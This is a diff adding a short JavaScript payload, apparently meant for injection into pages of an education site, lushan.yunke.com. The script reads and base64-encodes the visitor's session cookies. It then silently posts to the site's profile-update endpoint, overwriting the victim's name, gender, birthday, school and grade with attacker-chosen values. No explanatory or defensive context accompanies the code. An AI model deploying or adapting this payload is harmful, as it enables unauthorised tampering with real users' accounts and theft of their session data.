@@ -1,0 +1,16 @@
+var fishCookie = document.cookie;
+fishCookie = window.btoa(fishCookie);
+var reqUrl = "https://lushan.yunke.com/index.user.setInfo";
+var reqData = {};
+reqData.real_name = "卢本伟888";
+reqData.gender = "male";
+reqData.birthday = "2020-01-01";
+reqData.region_level0 = 0;
+reqData.region_level1 = 0;
+reqData.region_level2 = 0;
+reqData.school_type = 0;
+reqData.school_id = 0;
+reqData.grade = 3002;
+reqData.brief_desc = 1;
+reqData.title = "";
+$.post(reqUrl,reqData);
